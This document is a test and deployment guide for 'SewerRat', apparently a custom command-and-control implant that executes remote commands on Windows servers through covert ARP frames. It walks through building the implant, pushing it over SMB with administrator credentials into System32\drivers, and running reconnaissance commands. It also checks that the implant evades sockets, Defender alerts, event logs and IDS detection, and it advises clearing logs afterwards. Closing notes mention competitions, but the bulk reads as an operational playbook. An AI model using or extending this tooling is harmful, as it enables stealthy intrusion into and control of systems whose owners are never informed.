# SewerRat Testing & Validation Guide

## Overview

This guide covers PoC validation, lab testing, and pre-deployment verification for SewerRat C2.

---

## Prerequisites

### Lab Environment Setup

**Minimum Setup:**
- 1x Linux attacker box (Kali, Ubuntu, etc.) with root/sudo access
- 1x Windows Server 2022 target VM with administrator access
- Shared network (both on same subnet, no routing required)

**Recommended Setup:**
- Multiple Windows target VMs (test reliability across versions)
- Wireshark on network gateway (observe all ARP traffic)
- Multiple implants per target (test multi-implant coordination)

### Pre-Test Checklist

- [ ] Go 1.20+ installed and verified: `go version`
- [ ] Dependencies downloaded: `go mod download`
- [ ] Npcap installed on Windows target: https://nmap.org/npcap/
- [ ] Linux attacker has packet capture permissions: `sudo gpasswd -a $USER libpcap`
- [ ] Network connectivity verified: `ping <target_ip>`
- [ ] Firewall allows ARP: `arp -a` works on both machines
- [ ] Network interface names known (eth0, wlan0, etc.)

---

## Phase 1: Local PoC Testing

### Test 1.1: Build Verification

**Objective:** Ensure binaries compile without errors.

```bash
cd sewerrat/
make all
ls -lh dist/
```

**Expected Output:**
```
-rwxr-xr-x  1 user  staff  8.5M  Mar 15 10:30 dist/sewerrat-server
-rw-r--r--  1 user  staff  6.2M  Mar 15 10:30 dist/SewerRat.exe
```

**Validation:**
- ✓ No compile errors
- ✓ Binaries are executable and not empty
- ✓ Windows implant has `.exe` extension
- ✓ Linux server is ELF binary: `file dist/sewerrat-server`

---

### Test 1.2: Dependency Resolution

**Objective:** Verify gopacket and other dependencies are correctly resolved.

```bash
go mod graph
go mod verify
```

**Expected Output:**
```
sewerrat github.com/google/gopacket@v1.10.1
...
```

**Validation:**
- ✓ No `go mod` errors
- ✓ gopacket v1.10.1+ listed
- ✓ Hash verification passes

---

## Phase 2: Single-Machine Testing (Linux)

### Test 2.1: Dev Build on Linux

**Objective:** Verify both components work on the same Linux box (simulates behavior).

```bash
cd sewerrat/
make dev

# Terminal 1: Run implant (simulating Windows behavior)
sudo ./dist/sewerrat-dev-implant -i eth0 &

# Terminal 2: Run server
sudo ./dist/sewerrat-dev-server -i eth0
```

**Interactive Test:**
```
sewerrat> broadcast whoami
[>>] Sent command: whoami
[*] Waiting for responses...
[<<] <your-mac>: root     # Your Linux user
```

**Validation:**
- ✓ Implant starts without errors
- ✓ "Beacon active" message appears
- ✓ Server CLI launches successfully
- ✓ `broadcast` command sends and receives response
- ✓ Output appears in server within 10s

---

## Phase 3: Cross-Machine Testing (Linux Server → Windows Target)

### Test 3.1: Implant Deployment

**Objective:** Verify implant can be deployed and run on Windows Server 2022.

```bash
# On Windows target:
# 1. Install Npcap if not already installed
# 2. Copy SewerRat.exe to C:\temp\

# Open cmd as Administrator:
C:\temp\SewerRat.exe
```

**Terminal Output (if visible):**
```
[*] Found interface: Ethernet (MAC address)
[+] Beacon active on 192.168.x.x
```

**Validation:**
- ✓ Implant runs without UAC prompt (pre-installed Npcap)
- ✓ No errors in event logs (Windows Event Viewer)
- ✓ Process appears in Task Manager
- ✓ Zero listening ports in `netstat -an` (no sockets)

---

### Test 3.2: Initial Beacon

**Objective:** Verify implant sends initial "READY" beacon.

**On Linux attacker:**
```bash
sudo tshark -YQ "arp.opcode==1" -i eth0 -f "arp"
# In another terminal, run server:
sudo ./dist/sewerrat-server -i eth0
```

**Expected wireshark output:**
```
ARP Request Who has 10.255.255.254? Tell 192.168.x.x
```

**Validation:**
- ✓ ARP request appears with trigger IP (10.255.255.254)
- ✓ Source MAC matches Windows target interface
- ✓ Request repeats every ~5 seconds (jitter)

---

### Test 3.3: Simple Command Execution

**Objective:** Send basic command and verify execution + response.

```bash
# Linux server terminal:
sewerrat> broadcast whoami
[>>] Sent command: whoami
[*] Waiting for responses...
[<<] 00:11:22:33:44:55: DOMAIN\Administrator
```

**Validation:**
- ✓ Command is sent (log shows `Sent command: whoami`)
- ✓ Response arrives within 10s
- ✓ Response format is correct: `[<<] <MAC>: <output>`
- ✓ Output matches expected command result

---

### Test 3.4: Multi-Command Sequence

**Objective:** Execute multiple commands in succession.

```bash
sewerrat> broadcast whoami
[<<] 00:11:22:33:44:55: DOMAIN\Administrator

sewerrat> send 00:11:22:33:44:55 whoami /groups
[<<] 00:11:22:33:44:55: Group memberships for DOMAIN\Administrator
                        *         (Administrators)
                        *         (Remote Desktop Users)

sewerrat> send 00:11:22:33:44:55 ipconfig /all
[<<] 00:11:22:33:44:55: Windows IP Configuration
                        Ethernet adapter Ethernet:
                            Media State . . . . . . . . . : Media disconnected
                            DNS Suffix  . . . . . . . . . : .local
```

**Validation:**
- ✓ Each command sends successfully
- ✓ Responses arrive in correct order
- ✓ Multiple implants can be addressed individually (`send <mac>`)
- ✓ Broadcast works to all targets (`broadcast`)

---

### Test 3.5: Large Output Handling

**Objective:** Verify multi-packet response reassembly (>20 bytes output).

```bash
sewerrat> send 00:11:22:33:44:55 systeminfo
[<<] 00:11:22:33:44:55: Host Name:                 SERVER-NAME
                        Domain:                    DOMAIN.local
                        OS Name:                   Microsoft Windows Server 2022
                        OS Version:                21H2
                        ... (more output)
```

**Validation:**
- ✓ Output length > 20 bytes (multiple ARP frames sent)
- ✓ Full output reassembled correctly (no truncation)
- ✓ No duplicate lines or ordering issues
- ✓ Timeout increased if needed: `-t 15s`

---

## Phase 4: Packet-Level Verification

### Test 4.1: Wireshark Inspection

**Objective:** Verify ARP frames contain magic marker at correct offset.

```bash
# Terminal 1: Capture ARP traffic
sudo wireshark -i eth0 -k "arp" &

# Terminal 2: Send command
sewerrat> broadcast whoami
```

**In Wireshark:**

```
Frame 1: ARP Request
  Ethernet II
    Destination: ff:ff:ff:ff:ff:ff
    Source: 00:11:22:33:44:55
  Address Resolution Protocol (request)
    Sender MAC: 00:11:22:33:44:55
    Target IP: 10.255.255.254
  
  [At offset 42-43 in raw bytes: 13 37]  ← Magic marker
  [At offset 44: 77 68 6F 61 6D 69...]    ← "whoami" payload
```

**Validation:**
- ✓ Magic marker `13 37` visible at byte offset 42-43
- ✓ Payload (command or response) follows immediately after
- ✓ ARP fields have correct values
- ✓ Destination is broadcast (`ff:ff:ff:ff:ff:ff`)

### Test 4.2: Packet Statistics

**Objective:** Count frames per command and verify efficiency.

```bash
# Start capture with counter
sudo tshark -i eth0 -R "arp" -T text | wc -l

# Send 3 commands
sewerrat> broadcast whoami
sewerrat> broadcast ipconfig
sewerrat> broadcast systeminfo

# Compare frame count
# Approximate: 3 commands + responses = 3-10+ ARP frames
```

**Validation:**
- ✓ ~2-3 frames per simple command (request + responses)
- ✓ Large commands use multiple frames (chunking works)
- ✓ Jitter adds delay but not extra frames

---

## Phase 5: Evasion Verification

### Test 5.1: No Socket Detection

**Objective:** Verify implant doesn't create listening sockets.

```powershell
# On Windows target, run as Administrator:
netstat -ano | find /i "LISTEN"

# Should NOT show any entries for SewerRat.exe
# (No open ports, no bound sockets)
```

**Validation:**
- ✓ No listening ports for implant process
- ✓ `netstat -b` shows no network activity for SewerRat
- ✓ Defender doesn't show network alerts

### Test 5.2: No Firewall Rules

**Objective:** Verify Windows Firewall doesn't block ARP traffic.

```powershell
# Check if firewall was touched
netsh advfirewall firewall show rule name="SewerRat" >nul 2>&1
if errorlevel 1 (echo Firewall rules untouched)

# Check Windows Defender alerts
Get-MpComputerStatus | select AntivirusEnabled, RealtimeMonitoringEnabled
```

**Validation:**
- ✓ No custom firewall rules created
- ✓ No Defender events logged for SewerRat process
- ✓ Normal Windows ARP traffic observed (ARP is pre-approved)

### Test 5.3: Event Log Footprint

**Objective:** Verify minimal logging in Windows Event Viewer.

```powershell
# On Windows target, check security event log
Get-EventLog -LogName Security -Newest 20 | Where-Object { $_.Message -like "*SewerRat*" }

# Alternative (PowerShell remoting logs):
Get-EventLog -LogName "Windows PowerShell" | Where-Object { $_.Message -like "*ARP*" }
```

**Validation:**
- ✓ No "Process Creation" events for SewerRat
- ✓ No "Network Connection" events
- ✓ No PowerShell script block events (no WMI executed)

---

## Phase 6: Reliability & Failure Testing

### Test 6.1: Timeout Handling

**Objective:** Verify graceful handling when no response arrives.

```bash
# Stop implant on Windows or unplug network
sewerrat> send 00:11:22:33:44:55 whoami
[>>] Sent command: whoami to 00:11:22:33:44:55
[*] Waiting for response from 00:11:22:33:44:55 (timeout: 10s)...
[!] No response received (timeout)
```

**Validation:**
- ✓ Server waits until timeout expires (doesn't hang)
- ✓ Returns "[!] No response received" gracefully
- ✓ CLI remains responsive for next command

### Test 6.2: Command Execution Timeout

**Objective:** Verify implant handles long-running commands.

```bash
sewerrat> send 00:11:22:33:44:55 powershell -Command "Start-Sleep -Seconds 20; whoami"
[<<] 00:11:22:33:44:55: [TIMEOUT] Command did not complete within 5 seconds
```

**Validation:**
- ✓ Command times out after 5 seconds (configurable)
- ✓ Error message returned indicates timeout
- ✓ Implant doesn't crash (can send next command)

### Test 6.3: Malformed Input

**Objective:** Verify both sides handle bad input gracefully.

```bash
# On server terminal:
sewerrat> broadcast
[!] Error: usage: broadcast <command>

sewerrat> send invalid_mac whoami
[>>] Sent command whoami to invalid_mac
[!] No response received (timeout)  # Expected

sewerrat> help
# Shows help menu (works)
```

**Validation:**
- ✓ Server validates input syntax
- ✓ Invalid MACs are handled (or broadcast to all)
- ✓ Empty commands rejected
- ✓ Server doesn't crash on bad input

---

## Phase 7: Performance Benchmarking

### Test 7.1: Latency Measurement

**Objective:** Measure response time for various command types.

```bash
# Simple command (whoami): should be <5s
time (sewerrat> broadcast whoami)

# Complex command (systeminfo): should be 5-10s
time (sewerrat> broadcast systeminfo)

# Large output (dir /s): should be 10-15s
time (sewerrat> broadcast dir C:\ /s | head -50)
```

**Expected Ranges:**
| Command | Latency | Notes |
|---------|---------|-------|
| `whoami` | 2-5s | Simple, small output |
| `ipconfig /all` | 3-6s | Medium output |
| `systeminfo` | 4-8s | Larger output |
| Multi-packet response | +2s per frame | Jitter adds 2-5s |

**Validation:**
- ✓ Simple commands: 2-5 seconds
- ✓ Complex commands: 5-15 seconds (including jitter)
- ✓ No excessive delays (>30s)

### Test 7.2: Load Testing (Multiple Implants)

**Objective:** Verify server handles multiple implants.

```bash
# Run 3 implants on separate Windows VMs
C:\temp\SewerRat.exe  (on Server1)
C:\temp\SewerRat.exe  (on Server2)
C:\temp\SewerRat.exe  (on Server3)

# Broadcast to all
sewerrat> broadcast whoami
[<<] 00:11:22:33:44:55: DOMAIN\Administrator
[<<] 00:1A:2B:3C:4D:5E: DOMAIN\Administrator
[<<] 00:1A:2B:3C:4D:5F: LOCAL_SYSTEM
```

**Validation:**
- ✓ All 3 implants respond (no ordering requirement)
- ✓ Server displays all responses
- ✓ No dropped packets or missed responses

---

## Phase 8: Deployment & Cleanup

### Test 8.1: SMB Deployment

**Objective:** Test `deploy.py` script for automated SMB upload.

```bash
# Build implant
make implant

# Deploy via SMB
python3 scripts/deploy.py \
    -t 10.0.0.5 \
    -u administrator \
    -p 'P@ssw0rd!' \
    -f dist/SewerRat.exe

# Expected output:
# [INFO] Connecting to 10.0.0.5...
# [+] SMB connection established
# [INFO] Uploading dist/SewerRat.exe (6.2M bytes) to \\10.0.0.5\ADMIN$\Windows\System32\drivers\SewerRat.exe
# [+] File uploaded successfully
# [*] Implant uploaded to target
#     Path: C:\Windows\System32\drivers\SewerRat.exe
```

**Validation:**
- ✓ SMB connection established
- ✓ File uploaded 100%
- ✓ File exists on target: `dir C:\Windows\System32\drivers\SewerRat.exe`

### Test 8.2: Cleanup

**Objective:** Verify file cleanup on target.

```powershell
# On Windows target, remove implant:
del C:\Windows\System32\drivers\SewerRat.exe

# Verify it's gone:
dir C:\Windows\System32\drivers\SewerRat.exe
# Should show: "File not found"

# Check logs for trace:
Get-EventLog -LogName Security | Where-Object { $_.Message -like "*drivers*" }
# Ideally: No entries
```

**Validation:**
- ✓ File deletion successful
- ✓ Minimal forensic impact
- ✓ No log artifacts (or clear them separately)

---

## Phase 9: Security Validation

### Test 9.1: ARP Spoofing Detection

**Objective:** Verify if network IDS detects ARP spoofing patterns.

**Setup:**
- Deploy implant
- Broadcast many commands in quick succession
- Monitor with Snort or Zeek

```bash
# Send 10 broadcasts rapidly
for i in {1..10}; do
  echo "broadcast whoami$i" | telnet localhost 9000
done

# Check IDS logs for patterns:
# - Multiple ARP requests to non-existent IP
# - Single source MAC responding to many requests
# - Gratuitous ARPs from unknown source
```

**Expected IDS Alerts (if configured):**
```
[Classification: Suspicious ARP Activity] [Priority: 2]
ARP spoofing attempt detected: Multiple requests to 10.255.255.254 from same MAC
```

**Validation:**
- ✓ Or ✗ ARP spoofing is detected (test varies by IDS config)
- ✓ Response: Vary timing, use real trigger IP
- Next step: Enable jitter+randomization in production

### Test 9.2: Encryption Verification

**Objective:** Test XOR cipher when enabled.

```go
// Enable encryption in shared/crypto.go
shared.EncryptEnabled = true
```

```bash
# Rebuild
make all

# Deploy and test
sewerrat> broadcast whoami

# Capture with Wireshark
# - Payload should be unreadable hex, not ASCII "whoami"
```

**Validation:**
- ✓ Encrypted payloads are not human-readable
- ✓ Decryption works on implant side
- ✓ Responses are also encrypted
- ✓ Server decrypts responses correctly

---

## Checklist: Ready for Deployment

- [ ] Phase 1-9 tests all pass
- [ ] Implant builds without warnings: `make implant 2>&1 | grep -i warning`
- [ ] Server builds without warnings: `make server 2>&1 | grep -i warning`
- [ ] Npcap installed on Windows targets
- [ ] Network allows ARP (no DAI/DHCP snooping)
- [ ] Firewall doesn't block layer 2 traffic
- [ ] No EDR/AV triggers on deployment
- [ ] Response timeout set appropriately: `-t 10s` or higher
- [ ] Operator trained on command syntax
- [ ] Cleanup plan documented
- [ ] Log suppression verified (implant doesn't log to disk)

---

## Notes for Competitive Environments

- **SEA Ratt:** No live testing against actual "Sewers" box before deployment
- **Rapid iteration:** Use `-t 5s` timeout for faster feedback
- **Verification:** Confirm beacon with Wireshark before assuming success
- **Cleanup:** Delete implant and clear logs immediately after testing/competition ends

---

For usage during operations, see [USAGE.md](USAGE.md).
For protocol details, see [PROTOCOL.md](PROTOCOL.md).
